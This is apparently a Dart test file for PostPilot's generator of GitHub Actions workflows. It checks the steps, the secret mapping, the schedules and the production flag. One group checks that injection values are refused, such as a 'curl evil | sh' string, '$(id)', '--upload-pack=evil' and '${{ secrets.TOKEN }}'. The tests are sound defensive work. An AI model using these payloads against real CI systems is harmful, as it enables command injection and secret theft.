// The generated GitHub Actions workflow, parsed back with the yaml package: the structure, the secrets mapping, the
// schedule and the safety rules are what a CI run depends on, so they are asserted on the parsed document, and the run
// step is also compared with a hand-written golden.
import 'dart:convert';
import 'package:flutter_test/flutter_test.dart';
import 'package:postpilot/features/ci/domain/entities/ci_options.dart';
import 'package:postpilot/features/ci/domain/services/github_workflow_builder.dart';
import 'package:yaml/yaml.dart';

Map<String, Object?> _parse(String text) => (jsonDecode(jsonEncode(loadYaml(text))) as Map).cast<String, Object?>();

List<Map<String, Object?>> _steps(Map<String, Object?> doc) =>
    (((doc['jobs'] as Map)['api-tests'] as Map)['steps'] as List).map((s) => (s as Map).cast<String, Object?>()).toList();

Map<String, Object?> _step(Map<String, Object?> doc, String name) => _steps(doc).firstWhere((s) => s['name'] == name);

const _secrets = [CiSecret('odooApiKey', 'ODOO_API_KEY'), CiSecret('db.password', 'DB_PASSWORD')];

void main() {
  group('structure', () {
    late Map<String, Object?> doc;
    setUp(() => doc = _parse(GithubWorkflowBuilder.build(const CiOptions(environment: 'Staging', secrets: _secrets))));

    test('triggers on push, pull request and by hand; no schedule unless asked', () {
      final on = doc['on'] as Map;
      expect(on.keys, unorderedEquals(['push', 'pull_request', 'workflow_dispatch']));
    });

    test('the job runs on ubuntu with a timeout and read-only contents access', () {
      final job = (doc['jobs'] as Map)['api-tests'] as Map;
      expect(job['runs-on'], 'ubuntu-latest');
      expect(job['timeout-minutes'], 30);
      expect((doc['permissions'] as Map)['contents'], 'read');
      expect(job.containsKey('permissions'), isFalse, reason: 'issues: write is only added when an issue is to be opened');
    });

    test('checks out the repository, then PostPilot into a side folder at the chosen ref', () {
      final steps = _steps(doc);
      expect(steps[0]['uses'], 'actions/checkout@v4');
      expect(steps[1]['uses'], 'actions/checkout@v4');
      expect(steps[1]['with'], {'repository': 'ManzurulIslamBista/postpilot', 'ref': 'main', 'path': '.postpilot'});
    });

    test('sets up Flutter on the stable channel, then runs flutter pub get inside PostPilot', () {
      final flutter = _step(doc, 'Set up Flutter');
      expect(flutter['uses'], 'subosito/flutter-action@v2');
      expect((flutter['with'] as Map)['channel'], 'stable');
      final install = _step(doc, 'Install PostPilot');
      expect(install['working-directory'], '.postpilot');
      expect(install['run'], 'flutter pub get');
    });

    test('uploads report.xml as an artifact even when the run failed', () {
      final upload = _step(doc, 'Upload the report');
      expect(upload['uses'], 'actions/upload-artifact@v4');
      expect(upload['if'], 'always()');
      expect((upload['with'] as Map)['path'], 'report.xml');
    });

    test('the order is: this repo, PostPilot, Flutter, pub get, run, upload', () {
      expect(_steps(doc).map((s) => s['name']), [
        'Check out this repository',
        'Check out PostPilot',
        'Set up Flutter',
        'Install PostPilot',
        'Run the requests',
        'Upload the report',
      ]);
    });
  });

  group('the run step', () {
    test('golden for the default options with an environment', () {
      final doc = _parse(GithubWorkflowBuilder.build(const CiOptions(environment: 'Staging')));
      final run = _step(doc, 'Run the requests');
      expect(run['working-directory'], '.postpilot');
      expect(run['run'], 'dart run bin/postpilot.dart run "\$GITHUB_WORKSPACE/workspace.json" \\\n'
          '  --env Staging \\\n'
          '  --report junit --out "\$GITHUB_WORKSPACE/report.xml"\n');
      expect(run.containsKey('env'), isFalse, reason: 'no secrets, no env block');
    });

    test('flags appear only when chosen, in a fixed order', () {
      String command(CiOptions o) => _step(_parse(GithubWorkflowBuilder.build(o)), 'Run the requests')['run'] as String;
      expect(command(const CiOptions()), isNot(contains('--env')));
      expect(command(const CiOptions()), isNot(contains('--fail-on-skip')));
      expect(command(const CiOptions()), isNot(contains('--allow-production')));
      final all = command(const CiOptions(failOnSkip: true, bail: true, allowProduction: true, collection: 'Shop'));
      expect(all, contains('--collection Shop'));
      expect(all, contains('--fail-on-skip --bail --allow-production'));
    });

    test('the workspace path and an environment with spaces are quoted for the shell', () {
      final run = _step(
        _parse(GithubWorkflowBuilder.build(const CiOptions(environment: 'Staging (EU)', workspacePath: 'api tests/workspace.json'))),
        'Run the requests',
      )['run'] as String;
      expect(run, contains('"\$GITHUB_WORKSPACE/api tests/workspace.json"'));
      expect(run, contains("--env 'Staging (EU)'"));
    });

    test('a single quote in a name is escaped as the shell expects', () {
      final run = _step(_parse(GithubWorkflowBuilder.build(const CiOptions(environment: "Ann's"))), 'Run the requests')['run'] as String;
      expect(run, contains(r"--env 'Ann'\''s'"));
    });
  });

  group('secrets', () {
    test('every secret variable is mapped by name to a repository secret, in the run step only', () {
      final doc = _parse(GithubWorkflowBuilder.build(const CiOptions(environment: 'Staging', secrets: _secrets)));
      final env = (_step(doc, 'Run the requests')['env'] as Map).cast<String, Object?>();
      expect(env, {
        'POSTPILOT_VAR_odooApiKey': r'${{ secrets.ODOO_API_KEY }}',
        'POSTPILOT_VAR_db.password': r'${{ secrets.DB_PASSWORD }}',
      });
      for (final step in _steps(doc)) {
        if (step['name'] != 'Run the requests') {
          expect((step['env'] as Map?)?.keys.where((k) => '$k'.startsWith('POSTPILOT_VAR_')), anyOf(isNull, isEmpty), reason: '${step['name']}');
        }
      }
    });

    test('the file lists the secrets to create, names only', () {
      final text = GithubWorkflowBuilder.build(const CiOptions(secrets: _secrets));
      expect(text, contains('#   ODOO_API_KEY  (the value of the PostPilot variable odooApiKey)'));
      expect(text, contains('#   DB_PASSWORD  (the value of the PostPilot variable db.password)'));
    });

    test('the only secrets the file reads are the mapped ones, plus the token for the issue', () {
      final text = GithubWorkflowBuilder.build(
        const CiOptions(schedule: CiSchedulePreset.daily, openIssueOnFailure: true, secrets: _secrets),
      );
      final referenced = RegExp(r'secrets\.([A-Za-z0-9_]+)').allMatches(text).map((m) => m[1]).toSet();
      expect(referenced, {'ODOO_API_KEY', 'DB_PASSWORD', 'GITHUB_TOKEN'});
    });

    test('a variable name with a dot is kept as it is in the environment variable name', () {
      final text = GithubWorkflowBuilder.build(const CiOptions(secrets: [CiSecret('db.password', 'DB_PASSWORD')]));
      final env = (_step(_parse(text), 'Run the requests')['env'] as Map).keys.single;
      expect(env, 'POSTPILOT_VAR_db.password');
    });
  });

  group('schedule (the monitor)', () {
    test('a preset adds a cron trigger with its expression', () {
      final cases = {
        CiSchedulePreset.hourly: '17 * * * *',
        CiSchedulePreset.daily: '17 6 * * *',
        CiSchedulePreset.weekdays: '17 6 * * 1-5',
      };
      cases.forEach((preset, cron) {
        final on = _parse(GithubWorkflowBuilder.build(CiOptions(schedule: preset)))['on'] as Map;
        expect(on['schedule'], [
          {'cron': cron},
        ], reason: '$preset');
        expect(on.keys, containsAll(['push', 'pull_request', 'workflow_dispatch']));
      });
    });

    test('a custom cron is used as typed (trimmed)', () {
      final on = _parse(GithubWorkflowBuilder.build(const CiOptions(schedule: CiSchedulePreset.custom, customCron: ' */15 8-18 * * 1-5 ')))['on'] as Map;
      expect(on['schedule'], [
        {'cron': '*/15 8-18 * * 1-5'},
      ]);
    });

    test('an invalid custom cron is refused instead of written', () {
      expect(
        () => GithubWorkflowBuilder.build(const CiOptions(schedule: CiSchedulePreset.custom, customCron: '* * * * *')),
        throwsA(isA<ArgumentError>().having((e) => e.message, 'message', contains('every 1 minute'))),
      );
    });

    test('the cron expression is a quoted scalar, so a leading * cannot turn into a YAML alias', () {
      final text = GithubWorkflowBuilder.build(const CiOptions(schedule: CiSchedulePreset.custom, customCron: '*/10 * * * *'));
      expect(text, contains("- cron: '*/10 * * * *'"));
    });
  });

  group('the issue on a failed scheduled run', () {
    final options = const CiOptions(schedule: CiSchedulePreset.daily, openIssueOnFailure: true);

    test('is one extra step, only on schedule and failure, with issues: write for the job', () {
      final doc = _parse(GithubWorkflowBuilder.build(options));
      final step = _step(doc, 'Open or update an issue');
      expect(step['if'], "failure() && github.event_name == 'schedule'");
      expect((step['env'] as Map)['GH_TOKEN'], r'${{ secrets.GITHUB_TOKEN }}');
      final job = (doc['jobs'] as Map)['api-tests'] as Map;
      expect(job['permissions'], {'contents': 'read', 'issues': 'write'});
    });

    test('finds the open issue by its label and comments on it, or creates one', () {
      final script = _step(_parse(GithubWorkflowBuilder.build(options)), 'Open or update an issue')['run'] as String;
      expect(script, contains("label='postpilot-monitor'"));
      expect(script, contains('gh issue list'));
      expect(script, contains('--label "\$label" --state open'));
      expect(script, contains('gh issue comment "\$number"'));
      expect(script, contains('gh issue create'));
      expect(script, contains('gh label create'));
    });

    test('the run also writes the Markdown summary that becomes the issue body', () {
      final run = _step(_parse(GithubWorkflowBuilder.build(options)), 'Run the requests')['run'] as String;
      expect(run, contains('--markdown-out "\$GITHUB_WORKSPACE/postpilot-summary.md"'));
    });

    test('needs a schedule: without one the option adds nothing', () {
      final doc = _parse(GithubWorkflowBuilder.build(const CiOptions(openIssueOnFailure: true)));
      expect(_steps(doc).map((s) => s['name']), isNot(contains('Open or update an issue')));
      expect(((doc['jobs'] as Map)['api-tests'] as Map).containsKey('permissions'), isFalse);
    });
  });

  group('production', () {
    test('the lock stays on by default: --allow-production is absent and nothing warns', () {
      final text = GithubWorkflowBuilder.build(const CiOptions(environment: 'Production'));
      expect(text, isNot(contains('--allow-production')));
      expect(text, isNot(contains('WARNING')));
    });

    test('allowing production adds the flag and a warning in the file', () {
      final text = GithubWorkflowBuilder.build(const CiOptions(environment: 'Production', allowProduction: true));
      expect(text, contains('--allow-production'));
      expect(text, contains('WARNING: --allow-production is on'));
    });
  });

  group('refusing values that must not reach a command', () {
    void refuses(CiOptions o, String fragment) =>
        expect(() => GithubWorkflowBuilder.build(o), throwsA(isA<ArgumentError>().having((e) => e.message, 'message', contains(fragment))));

    test('an environment that would break out of the command', () {
      refuses(const CiOptions(environment: 'x"\n; curl evil | sh'), 'control character');
    });

    test('an environment or collection that GitHub would read as an expression', () {
      refuses(const CiOptions(environment: r'${{ secrets.TOKEN }}'), 'expression');
      refuses(const CiOptions(collection: r'a ${{ github.token }}'), 'expression');
    });

    test('a workspace path outside the repository or with shell characters', () {
      refuses(const CiOptions(workspacePath: '../outside/workspace.json'), 'inside the repository');
      refuses(const CiOptions(workspacePath: '/etc/workspace.json'), 'relative to its root');
      refuses(const CiOptions(workspacePath: r'a"; id; "b.json'), 'may only use');
      refuses(const CiOptions(workspacePath: r'$(id)/workspace.json'), 'may only use');
      refuses(const CiOptions(workspacePath: ''), 'Enter the path');
    });

    test('a PostPilot ref that is an option or has spaces', () {
      refuses(const CiOptions(postpilotRef: '--upload-pack=evil'), 'cannot start with a dash');
      refuses(const CiOptions(postpilotRef: 'main; id'), 'may only use');
      refuses(const CiOptions(postpilotRef: ''), 'Enter a branch');
    });

    test('a tag, a branch with a slash and a commit hash are fine', () {
      for (final ref in const ['v1.2.3', 'feature/ci-setup', '3f2a9c1d4e5b6a7980123456789abcdef0123456']) {
        final doc = _parse(GithubWorkflowBuilder.build(CiOptions(postpilotRef: ref)));
        expect((_step(doc, 'Check out PostPilot')['with'] as Map)['ref'], ref);
      }
    });
  });

  test('the whole file is valid YAML with no tabs and ends with a newline', () {
    final text = GithubWorkflowBuilder.build(const CiOptions(
      environment: 'Staging',
      schedule: CiSchedulePreset.weekdays,
      openIssueOnFailure: true,
      failOnSkip: true,
      bail: true,
      secrets: _secrets,
    ));
    expect(() => loadYaml(text), returnsNormally);
    expect(text, isNot(contains('\t')));
    expect(text.endsWith('\n'), isTrue);
    expect(GithubWorkflowBuilder.path, '.github/workflows/postpilot.yml');
  });
}
